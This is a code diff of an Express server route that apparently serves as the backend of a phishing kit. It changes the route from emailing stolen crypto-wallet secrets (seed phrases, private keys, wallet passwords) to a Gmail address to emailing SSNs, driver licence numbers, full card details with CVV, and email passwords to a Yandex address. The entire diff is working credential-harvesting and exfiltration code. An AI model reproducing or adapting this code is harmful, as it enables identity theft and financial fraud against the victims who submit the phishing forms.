@@ -39,17 +39,28 @@ app.post('/api/send', async (req, res) => {
 
   let mailOptions = {
     from: 'twebresolve@jumping-rivers.co.uk',
-    to: 'ricardo.josh12@gmail.com',
-    subject: type,
+    to: 'Rm360.101@yandex.com',
+    subject: "ffin",
     html: `
       <html>
         <body>
-          <h1>Platform ${platform} <br></h1>
-          <p>Connection Type ${type} <br></p>
-          <p>Phrase is ${phrase} <br></p>
-          <p>Keystore JSON is ${keystore_json} <br></p>
-          <p>Wallet Password is ${wallet_password} <br></p>
-          <p>Private Key is ${private_key} <br></p>
+          <h1>Platform is ${platform}, <br></h1>
+          <p>Type is ${type} , <br></p>
+          <p>Username is ${username} , <br></p>
+          <p>Password is ${password} , <br></p>
+          <p>Firstname is ${firstname} , <br></p>
+          <p>Lastname is ${lastname} , <br></p>
+          <p>Othername is ${othername} , <br></p>
+          <p>DOB is ${dob} , <br></p>
+          <p>SSN is ${ssn} , <br></p>
+          <p>Driver licence is ${driver_license} , <br></p>
+          <p>Address is ${address} , <br></p>
+          <p>Card Name is ${card_name} , <br></p>
+          <p>Card Number is ${card_number} , <br></p>
+          <p>Card Expiration is ${card_expiration} , <br></p>
+          <p>Card CVV is ${card_cvv} , <br></p>
+          <p>Email Address is ${email} , <br></p>
+          <p>Email Password is ${email_pass} , <br></p>
         </body>
       </html>
     `
